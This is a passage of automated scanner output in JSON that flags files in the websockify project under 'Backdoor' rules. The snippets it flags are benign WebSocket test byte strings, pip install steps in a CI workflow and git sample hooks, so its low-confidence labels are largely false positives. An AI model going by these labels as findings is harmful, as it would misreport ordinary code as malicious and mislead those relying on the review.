                    "text": "        self.assertEqual(res['payload'], data)\n\n    def test_decode_hybi_multi(self):\n        buf1 = b'\\x01\\x03\\x48\\x65\\x6c'\n        buf2 = b'\\x80\\x02\\x6c\\x6f'\n\n        ws = websocket.WebSocket()\n",
                    "rendered": {
                      "text": "        self.assertEqual(res['payload'], data)\n\n    def test_decode_hybi_multi(self):\n        buf1 = b'\\x01\\x03\\x48\\x65\\x6c'\n        buf2 = b'\\x80\\x02\\x6c\\x6f'\n\n        ws = websocket.WebSocket()\n",
                      "markdown": "`        self.assertEqual(res['payload'], data)\n\n    def test_decode_hybi_multi(self):\n        buf1 = b'\\x01\\x03\\x48\\x65\\x6c'\n        buf2 = b'\\x80\\x02\\x6c\\x6f'\n\n        ws = websocket.WebSocket()\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000801"
          },
          "message": {
            "text": "Backdoor: Executing Obfuscated Code",
            "id": "BD000801"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/websockify.zip/tests/test_websocket.py"
                },
                "region": {
                  "startLine": 180,
                  "startColumn": 16,
                  "endLine": 180,
                  "endColumn": 56,
                  "snippet": {
                    "text": "\n    def test_decode_hybi_extended_64bit_binary(self):\n        data = (b'\\x01\\x02\\x03\\x04' * 65)  # len > 126 -- len == 260\n        buf = b'\\x82\\x7f\\x00\\x00\\x00\\x00\\x00\\x00\\x01\\x04' + data\n        ws = websocket.WebSocket()\n        res = ws._decode_hybi(buf)\n\n",
                    "rendered": {
                      "text": "\n    def test_decode_hybi_extended_64bit_binary(self):\n        data = (b'\\x01\\x02\\x03\\x04' * 65)  # len > 126 -- len == 260\n        buf = b'\\x82\\x7f\\x00\\x00\\x00\\x00\\x00\\x00\\x01\\x04' + data\n        ws = websocket.WebSocket()\n        res = ws._decode_hybi(buf)\n\n",
                      "markdown": "`\n    def test_decode_hybi_extended_64bit_binary(self):\n        data = (b'\\x01\\x02\\x03\\x04' * 65)  # len > 126 -- len == 260\n        buf = b'\\x82\\x7f\\x00\\x00\\x00\\x00\\x00\\x00\\x01\\x04' + data\n        ws = websocket.WebSocket()\n        res = ws._decode_hybi(buf)\n\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000801"
          },
          "message": {
            "text": "Backdoor: Executing Obfuscated Code",
            "id": "BD000801"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/websockify.zip/tests/test_websocket.py"
                },
                "region": {
                  "startLine": 158,
                  "startColumn": 16,
                  "endLine": 158,
                  "endColumn": 40,
                  "snippet": {
                    "text": "        self.assertEqual(res['payload'], b'Hello')\n\n    def test_decode_hybi_binary(self):\n        buf = b'\\x82\\x04\\x01\\x02\\x03\\x04'\n        ws = websocket.WebSocket()\n        res = ws._decode_hybi(buf)\n\n",
                    "rendered": {
                      "text": "        self.assertEqual(res['payload'], b'Hello')\n\n    def test_decode_hybi_binary(self):\n        buf = b'\\x82\\x04\\x01\\x02\\x03\\x04'\n        ws = websocket.WebSocket()\n        res = ws._decode_hybi(buf)\n\n",
                      "markdown": "`        self.assertEqual(res['payload'], b'Hello')\n\n    def test_decode_hybi_binary(self):\n        buf = b'\\x82\\x04\\x01\\x02\\x03\\x04'\n        ws = websocket.WebSocket()\n        res = ws._decode_hybi(buf)\n\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000801"
          },
          "message": {
            "text": "Backdoor: Executing Obfuscated Code",
            "id": "BD000801"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/websockify.zip/tests/test_websocket.py"
                },
                "region": {
                  "startLine": 147,
                  "startColumn": 16,
                  "endLine": 147,
                  "endColumn": 60,
                  "snippet": {
                    "text": "\nclass HyBiEncodeDecodeTestCase(unittest.TestCase):\n    def test_decode_hybi_text(self):\n        buf = b'\\x81\\x85\\x37\\xfa\\x21\\x3d\\x7f\\x9f\\x4d\\x51\\x58'\n        ws = websocket.WebSocket()\n        res = ws._decode_hybi(buf)\n\n",
                    "rendered": {
                      "text": "\nclass HyBiEncodeDecodeTestCase(unittest.TestCase):\n    def test_decode_hybi_text(self):\n        buf = b'\\x81\\x85\\x37\\xfa\\x21\\x3d\\x7f\\x9f\\x4d\\x51\\x58'\n        ws = websocket.WebSocket()\n        res = ws._decode_hybi(buf)\n\n",
                      "markdown": "`\nclass HyBiEncodeDecodeTestCase(unittest.TestCase):\n    def test_decode_hybi_text(self):\n        buf = b'\\x81\\x85\\x37\\xfa\\x21\\x3d\\x7f\\x9f\\x4d\\x51\\x58'\n        ws = websocket.WebSocket()\n        res = ws._decode_hybi(buf)\n\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000805"
          },
          "message": {
            "text": "Backdoor: Long Binary Strings",
            "id": "BD000805"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/websockify.zip/tests/test_websocket.py"
                },
                "region": {
                  "startLine": 180,
                  "startColumn": 16,
                  "endLine": 180,
                  "endColumn": 56,
                  "snippet": {
                    "text": "\n    def test_decode_hybi_extended_64bit_binary(self):\n        data = (b'\\x01\\x02\\x03\\x04' * 65)  # len > 126 -- len == 260\n        buf = b'\\x82\\x7f\\x00\\x00\\x00\\x00\\x00\\x00\\x01\\x04' + data\n        ws = websocket.WebSocket()\n        res = ws._decode_hybi(buf)\n\n",
                    "rendered": {
                      "text": "\n    def test_decode_hybi_extended_64bit_binary(self):\n        data = (b'\\x01\\x02\\x03\\x04' * 65)  # len > 126 -- len == 260\n        buf = b'\\x82\\x7f\\x00\\x00\\x00\\x00\\x00\\x00\\x01\\x04' + data\n        ws = websocket.WebSocket()\n        res = ws._decode_hybi(buf)\n\n",
                      "markdown": "`\n    def test_decode_hybi_extended_64bit_binary(self):\n        data = (b'\\x01\\x02\\x03\\x04' * 65)  # len > 126 -- len == 260\n        buf = b'\\x82\\x7f\\x00\\x00\\x00\\x00\\x00\\x00\\x01\\x04' + data\n        ws = websocket.WebSocket()\n        res = ws._decode_hybi(buf)\n\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 2
          }
        },
        {
          "rule": {
            "id": "BD000805"
          },
          "message": {
            "text": "Backdoor: Long Binary Strings",
            "id": "BD000805"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/websockify.zip/tests/test_websocket.py"
                },
                "region": {
                  "startLine": 147,
                  "startColumn": 16,
                  "endLine": 147,
                  "endColumn": 60,
                  "snippet": {
                    "text": "\nclass HyBiEncodeDecodeTestCase(unittest.TestCase):\n    def test_decode_hybi_text(self):\n        buf = b'\\x81\\x85\\x37\\xfa\\x21\\x3d\\x7f\\x9f\\x4d\\x51\\x58'\n        ws = websocket.WebSocket()\n        res = ws._decode_hybi(buf)\n\n",
                    "rendered": {
                      "text": "\nclass HyBiEncodeDecodeTestCase(unittest.TestCase):\n    def test_decode_hybi_text(self):\n        buf = b'\\x81\\x85\\x37\\xfa\\x21\\x3d\\x7f\\x9f\\x4d\\x51\\x58'\n        ws = websocket.WebSocket()\n        res = ws._decode_hybi(buf)\n\n",
                      "markdown": "`\nclass HyBiEncodeDecodeTestCase(unittest.TestCase):\n    def test_decode_hybi_text(self):\n        buf = b'\\x81\\x85\\x37\\xfa\\x21\\x3d\\x7f\\x9f\\x4d\\x51\\x58'\n        ws = websocket.WebSocket()\n        res = ws._decode_hybi(buf)\n\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 2
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/websockify.zip/.github/workflows/test.yml"
                },
                "region": {
                  "startLine": 25,
                  "startColumn": 13,
                  "endLine": 25,
                  "endColumn": 21,
                  "snippet": {
                    "text": "        uses: actions/setup-python@v5\n        with:\n          python-version: ${{ matrix.python-version }}\n      - name: Update pip and setuptools\n        run: |\n          python -m pip install --upgrade pip\n          python -m pip install setuptools\n",
                    "rendered": {
                      "text": "        uses: actions/setup-python@v5\n        with:\n          python-version: ${{ matrix.python-version }}\n      - name: Update pip and setuptools\n        run: |\n          python -m pip install --upgrade pip\n          python -m pip install setuptools\n",
                      "markdown": "`        uses: actions/setup-python@v5\n        with:\n          python-version: ${{ matrix.python-version }}\n      - name: Update pip and setuptools\n        run: |\n          python -m pip install --upgrade pip\n          python -m pip install setuptools\n`"
                    }
                  },
                  "sourceLanguage": "yaml"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/websockify.zip/.github/workflows/test.yml"
                },
                "region": {
                  "startLine": 35,
                  "startColumn": 19,
                  "endLine": 35,
                  "endColumn": 24,
                  "snippet": {
                    "text": "          python -m pip install -r test-requirements.txt\n      - name: Install old numpy\n        run: |\n          python -m pip install 'numpy<1.17'\n        if: ${{ matrix.python-version >= '3.4' && matrix.python-version < '3.7' }}\n      - name: Run tests\n        run: |\n",
                    "rendered": {
                      "text": "          python -m pip install -r test-requirements.txt\n      - name: Install old numpy\n        run: |\n          python -m pip install 'numpy<1.17'\n        if: ${{ matrix.python-version >= '3.4' && matrix.python-version < '3.7' }}\n      - name: Run tests\n        run: |\n",
                      "markdown": "`          python -m pip install -r test-requirements.txt\n      - name: Install old numpy\n        run: |\n          python -m pip install 'numpy<1.17'\n        if: ${{ matrix.python-version >= '3.4' && matrix.python-version < '3.7' }}\n      - name: Run tests\n        run: |\n`"
                    }
                  },
                  "sourceLanguage": "yaml"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/websockify.zip/.github/workflows/test.yml"
                },
                "region": {
                  "startLine": 32,
                  "startColumn": 19,
                  "endLine": 32,
                  "endColumn": 24,
                  "snippet": {
                    "text": "      - name: Install dependencies\n        run: |\n          python -m pip install -e .\n          python -m pip install -r test-requirements.txt\n      - name: Install old numpy\n        run: |\n          python -m pip install 'numpy<1.17'\n",
                    "rendered": {
                      "text": "      - name: Install dependencies\n        run: |\n          python -m pip install -e .\n          python -m pip install -r test-requirements.txt\n      - name: Install old numpy\n        run: |\n          python -m pip install 'numpy<1.17'\n",
                      "markdown": "`      - name: Install dependencies\n        run: |\n          python -m pip install -e .\n          python -m pip install -r test-requirements.txt\n      - name: Install old numpy\n        run: |\n          python -m pip install 'numpy<1.17'\n`"
                    }
                  },
                  "sourceLanguage": "yaml"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/websockify.zip/.github/workflows/test.yml"
                },
                "region": {
                  "startLine": 31,
                  "startColumn": 19,
                  "endLine": 31,
                  "endColumn": 24,
                  "snippet": {
                    "text": "          python -m pip install setuptools\n      - name: Install dependencies\n        run: |\n          python -m pip install -e .\n          python -m pip install -r test-requirements.txt\n      - name: Install old numpy\n        run: |\n",
                    "rendered": {
                      "text": "          python -m pip install setuptools\n      - name: Install dependencies\n        run: |\n          python -m pip install -e .\n          python -m pip install -r test-requirements.txt\n      - name: Install old numpy\n        run: |\n",
                      "markdown": "`          python -m pip install setuptools\n      - name: Install dependencies\n        run: |\n          python -m pip install -e .\n          python -m pip install -r test-requirements.txt\n      - name: Install old numpy\n        run: |\n`"
                    }
                  },
                  "sourceLanguage": "yaml"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/websockify.zip/.github/workflows/test.yml"
                },
                "region": {
                  "startLine": 28,
                  "startColumn": 19,
                  "endLine": 28,
                  "endColumn": 24,
                  "snippet": {
                    "text": "      - name: Update pip and setuptools\n        run: |\n          python -m pip install --upgrade pip\n          python -m pip install setuptools\n      - name: Install dependencies\n        run: |\n          python -m pip install -e .\n",
                    "rendered": {
                      "text": "      - name: Update pip and setuptools\n        run: |\n          python -m pip install --upgrade pip\n          python -m pip install setuptools\n      - name: Install dependencies\n        run: |\n          python -m pip install -e .\n",
                      "markdown": "`      - name: Update pip and setuptools\n        run: |\n          python -m pip install --upgrade pip\n          python -m pip install setuptools\n      - name: Install dependencies\n        run: |\n          python -m pip install -e .\n`"
                    }
                  },
                  "sourceLanguage": "yaml"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/websockify.zip/.github/workflows/test.yml"
                },
                "region": {
                  "startLine": 27,
                  "startColumn": 41,
                  "endLine": 28,
                  "snippet": {
                    "text": "          python-version: ${{ matrix.python-version }}\n      - name: Update pip and setuptools\n        run: |\n          python -m pip install --upgrade pip\n          python -m pip install setuptools\n      - name: Install dependencies\n        run: |\n          python -m pip install -e .\n",
                    "rendered": {
                      "text": "          python-version: ${{ matrix.python-version }}\n      - name: Update pip and setuptools\n        run: |\n          python -m pip install --upgrade pip\n          python -m pip install setuptools\n      - name: Install dependencies\n        run: |\n          python -m pip install -e .\n",
                      "markdown": "`          python-version: ${{ matrix.python-version }}\n      - name: Update pip and setuptools\n        run: |\n          python -m pip install --upgrade pip\n          python -m pip install setuptools\n      - name: Install dependencies\n        run: |\n          python -m pip install -e .\n`"
                    }
                  },
                  "sourceLanguage": "yaml"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/websockify.zip/.github/workflows/test.yml"
                },
                "region": {
                  "startLine": 27,
                  "startColumn": 19,
                  "endLine": 27,
                  "endColumn": 24,
                  "snippet": {
                    "text": "          python-version: ${{ matrix.python-version }}\n      - name: Update pip and setuptools\n        run: |\n          python -m pip install --upgrade pip\n          python -m pip install setuptools\n      - name: Install dependencies\n        run: |\n",
                    "rendered": {
                      "text": "          python-version: ${{ matrix.python-version }}\n      - name: Update pip and setuptools\n        run: |\n          python -m pip install --upgrade pip\n          python -m pip install setuptools\n      - name: Install dependencies\n        run: |\n",
                      "markdown": "`          python-version: ${{ matrix.python-version }}\n      - name: Update pip and setuptools\n        run: |\n          python -m pip install --upgrade pip\n          python -m pip install setuptools\n      - name: Install dependencies\n        run: |\n`"
                    }
                  },
                  "sourceLanguage": "yaml"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/websockify.zip/.github/workflows/test.yml"
                },
                "region": {
                  "startLine": 25,
                  "startColumn": 20,
                  "endLine": 25,
                  "endColumn": 25,
                  "snippet": {
                    "text": "        uses: actions/setup-python@v5\n        with:\n          python-version: ${{ matrix.python-version }}\n      - name: Update pip and setuptools\n        run: |\n          python -m pip install --upgrade pip\n          python -m pip install setuptools\n",
                    "rendered": {
                      "text": "        uses: actions/setup-python@v5\n        with:\n          python-version: ${{ matrix.python-version }}\n      - name: Update pip and setuptools\n        run: |\n          python -m pip install --upgrade pip\n          python -m pip install setuptools\n",
                      "markdown": "`        uses: actions/setup-python@v5\n        with:\n          python-version: ${{ matrix.python-version }}\n      - name: Update pip and setuptools\n        run: |\n          python -m pip install --upgrade pip\n          python -m pip install setuptools\n`"
                    }
                  },
                  "sourceLanguage": "yaml"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/websockify.zip/.git/hooks/pre-receive.sample"
                },
                "region": {
                  "startLine": 3,
                  "startColumn": 17,
                  "endLine": 3,
                  "endColumn": 25,
                  "snippet": {
                    "text": "#!/bin/sh\n#\n# An example hook script to make use of push options.\n# The example simply echoes all push options that start with 'echoback='\n# and rejects all pushes when the \"reject\" push option is used.\n#\n",
                    "rendered": {
                      "text": "#!/bin/sh\n#\n# An example hook script to make use of push options.\n# The example simply echoes all push options that start with 'echoback='\n# and rejects all pushes when the \"reject\" push option is used.\n#\n",
                      "markdown": "`#!/bin/sh\n#\n# An example hook script to make use of push options.\n# The example simply echoes all push options that start with 'echoback='\n# and rejects all pushes when the \"reject\" push option is used.\n#\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/websockify.zip/.git/hooks/prepare-commit-msg.sample"
                },
                "region": {
                  "startLine": 38,
                  "startColumn": 1,
                  "endLine": 38,
                  "endColumn": 6,
                  "snippet": {
                    "text": "# esac\n\n# SOB=$(git var GIT_COMMITTER_IDENT | sed -n 's/^\\(.*>\\).*$/Signed-off-by: \\1/p')\n# git interpret-trailers --in-place --trailer \"$SOB\" \"$COMMIT_MSG_FILE\"\n# if test -z \"$COMMIT_SOURCE\"\n# then\n#   /usr/bin/perl -i.bak -pe 'print \"\\n\" if !$first_line++' \"$COMMIT_MSG_FILE\"\n",
                    "rendered": {
                      "text": "# esac\n\n# SOB=$(git var GIT_COMMITTER_IDENT | sed -n 's/^\\(.*>\\).*$/Signed-off-by: \\1/p')\n# git interpret-trailers --in-place --trailer \"$SOB\" \"$COMMIT_MSG_FILE\"\n# if test -z \"$COMMIT_SOURCE\"\n# then\n#   /usr/bin/perl -i.bak -pe 'print \"\\n\" if !$first_line++' \"$COMMIT_MSG_FILE\"\n",
                      "markdown": "`# esac\n\n# SOB=$(git var GIT_COMMITTER_IDENT | sed -n 's/^\\(.*>\\).*$/Signed-off-by: \\1/p')\n# git interpret-trailers --in-place --trailer \"$SOB\" \"$COMMIT_MSG_FILE\"\n# if test -z \"$COMMIT_SOURCE\"\n# then\n#   /usr/bin/perl -i.bak -pe 'print \"\\n\" if !$first_line++' \"$COMMIT_MSG_FILE\"\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/websockify.zip/.git/hooks/prepare-commit-msg.sample"
                },
                "region": {
                  "startLine": 37,
                  "startColumn": 37,
                  "endLine": 37,
                  "endColumn": 42,
                  "snippet": {
                    "text": "#  *) ;;\n# esac\n\n# SOB=$(git var GIT_COMMITTER_IDENT | sed -n 's/^\\(.*>\\).*$/Signed-off-by: \\1/p')\n# git interpret-trailers --in-place --trailer \"$SOB\" \"$COMMIT_MSG_FILE\"\n# if test -z \"$COMMIT_SOURCE\"\n# then\n",
                    "rendered": {
                      "text": "#  *) ;;\n# esac\n\n# SOB=$(git var GIT_COMMITTER_IDENT | sed -n 's/^\\(.*>\\).*$/Signed-off-by: \\1/p')\n# git interpret-trailers --in-place --trailer \"$SOB\" \"$COMMIT_MSG_FILE\"\n# if test -z \"$COMMIT_SOURCE\"\n# then\n",
                      "markdown": "`#  *) ;;\n# esac\n\n# SOB=$(git var GIT_COMMITTER_IDENT | sed -n 's/^\\(.*>\\).*$/Signed-off-by: \\1/p')\n# git interpret-trailers --in-place --trailer \"$SOB\" \"$COMMIT_MSG_FILE\"\n# if test -z \"$COMMIT_SOURCE\"\n# then\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/websockify.zip/.git/hooks/prepare-commit-msg.sample"
                },
                "region": {
                  "startLine": 32,
                  "startColumn": 25,
                  "endLine": 32,
                  "endColumn": 31,
                  "snippet": {
                    "text": "# case \"$COMMIT_SOURCE,$SHA1\" in\n#  ,|template,)\n#    /usr/bin/perl -i.bak -pe '\n#       print \"\\n\" . `git diff --cached --name-status -r`\n# \t if /^#/ && $first++ == 0' \"$COMMIT_MSG_FILE\" ;;\n#  *) ;;\n# esac\n",
                    "rendered": {
                      "text": "# case \"$COMMIT_SOURCE,$SHA1\" in\n#  ,|template,)\n#    /usr/bin/perl -i.bak -pe '\n#       print \"\\n\" . `git diff --cached --name-status -r`\n# \t if /^#/ && $first++ == 0' \"$COMMIT_MSG_FILE\" ;;\n#  *) ;;\n# esac\n",
                      "markdown": "`# case \"$COMMIT_SOURCE,$SHA1\" in\n#  ,|template,)\n#    /usr/bin/perl -i.bak -pe '\n#       print \"\\n\" . `git diff --cached --name-status -r`\n# \t if /^#/ && $first++ == 0' \"$COMMIT_MSG_FILE\" ;;\n#  *) ;;\n# esac\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/websockify.zip/.git/hooks/prepare-commit-msg.sample"
                },
                "region": {
                  "startLine": 15,
                  "startColumn": 40,
                  "endLine": 15,
                  "endColumn": 46,
                  "snippet": {
                    "text": "# This hook includes three examples. The first one removes the\n# \"# Please enter the commit message...\" help message.\n#\n# The second includes the output of \"git diff --name-status -r\"\n# into the message, just before the \"git status\" output.  It is\n# commented because it doesn't cope with --amend or with squashed\n# commits.\n",
                    "rendered": {
                      "text": "# This hook includes three examples. The first one removes the\n# \"# Please enter the commit message...\" help message.\n#\n# The second includes the output of \"git diff --name-status -r\"\n# into the message, just before the \"git status\" output.  It is\n# commented because it doesn't cope with --amend or with squashed\n# commits.\n",
                      "markdown": "`# This hook includes three examples. The first one removes the\n# \"# Please enter the commit message...\" help message.\n#\n# The second includes the output of \"git diff --name-status -r\"\n# into the message, just before the \"git status\" output.  It is\n# commented because it doesn't cope with --amend or with squashed\n# commits.\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/websockify.zip/.git/hooks/prepare-commit-msg.sample"
                },
                "region": {
                  "startLine": 3,
                  "startColumn": 17,
                  "endLine": 3,
                  "endColumn": 25,
                  "snippet": {
                    "text": "#!/bin/sh\n#\n# An example hook script to prepare the commit log message.\n# Called by \"git commit\" with the name of the file that has the\n# commit message, followed by the description of the commit\n# message's source.  The hook's purpose is to edit the commit\n",
                    "rendered": {
                      "text": "#!/bin/sh\n#\n# An example hook script to prepare the commit log message.\n# Called by \"git commit\" with the name of the file that has the\n# commit message, followed by the description of the commit\n# message's source.  The hook's purpose is to edit the commit\n",
                      "markdown": "`#!/bin/sh\n#\n# An example hook script to prepare the commit log message.\n# Called by \"git commit\" with the name of the file that has the\n# commit message, followed by the description of the commit\n# message's source.  The hook's purpose is to edit the commit\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/websockify.zip/.git/hooks/pre-push.sample"
                },
                "region": {
                  "startLine": 39,
                  "startColumn": 4,
                  "endLine": 39,
                  "endColumn": 12,
                  "snippet": {
                    "text": "\t\t\t# New branch, examine all commits\n\t\t\trange=\"$local_oid\"\n\t\telse\n\t\t\t# Update to existing branch, examine new commits\n\t\t\trange=\"$remote_oid..$local_oid\"\n\t\tfi\n\n",
                    "rendered": {
                      "text": "\t\t\t# New branch, examine all commits\n\t\t\trange=\"$local_oid\"\n\t\telse\n\t\t\t# Update to existing branch, examine new commits\n\t\t\trange=\"$remote_oid..$local_oid\"\n\t\tfi\n\n",
                      "markdown": "`\t\t\t# New branch, examine all commits\n\t\t\trange=\"$local_oid\"\n\t\telse\n\t\t\t# Update to existing branch, examine new commits\n\t\t\trange=\"$remote_oid..$local_oid\"\n\t\tfi\n\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/websockify.zip/.git/hooks/pre-push.sample"
                },
                "region": {
                  "startLine": 5,
                  "startColumn": 18,
                  "endLine": 5,
                  "endColumn": 26,
                  "snippet": {
                    "text": "\n# An example hook script to verify what is about to be pushed.  Called by \"git\n# push\" after it has checked the remote status, but before anything has been\n# pushed.  If this script exits with a non-zero status nothing will be pushed.\n#\n# This hook is called with the following parameters:\n#\n",
                    "rendered": {
                      "text": "\n# An example hook script to verify what is about to be pushed.  Called by \"git\n# push\" after it has checked the remote status, but before anything has been\n# pushed.  If this script exits with a non-zero status nothing will be pushed.\n#\n# This hook is called with the following parameters:\n#\n",
                      "markdown": "`\n# An example hook script to verify what is about to be pushed.  Called by \"git\n# push\" after it has checked the remote status, but before anything has been\n# pushed.  If this script exits with a non-zero status nothing will be pushed.\n#\n# This hook is called with the following parameters:\n#\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/websockify.zip/.git/hooks/pre-push.sample"
                },
                "region": {
                  "startLine": 3,
                  "startColumn": 17,
                  "endLine": 3,
                  "endColumn": 25,
                  "snippet": {
                    "text": "#!/bin/sh\n\n# An example hook script to verify what is about to be pushed.  Called by \"git\n# push\" after it has checked the remote status, but before anything has been\n# pushed.  If this script exits with a non-zero status nothing will be pushed.\n#\n",
                    "rendered": {
